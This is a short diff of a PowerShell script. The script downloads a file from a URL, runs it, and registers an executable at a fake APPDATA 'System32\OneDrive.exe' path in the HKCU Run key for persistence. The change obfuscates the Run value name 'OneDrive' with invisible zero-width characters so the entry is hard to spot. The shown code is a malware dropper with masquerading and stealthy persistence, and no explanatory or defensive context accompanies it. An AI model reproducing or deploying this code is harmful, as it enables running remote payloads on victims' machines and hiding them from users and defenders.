@@ -5,5 +5,5 @@ Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
 $exePath = "$env:APPDATA\System32\OneDrive.exe"
 $regKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-$regValueName = "OneDrive"
+$regValueName = "‌‌OneDrive‌‌ ‌‌"
 Set-ItemProperty -Path $regKeyPath -Name $regValueName -Value $exePath
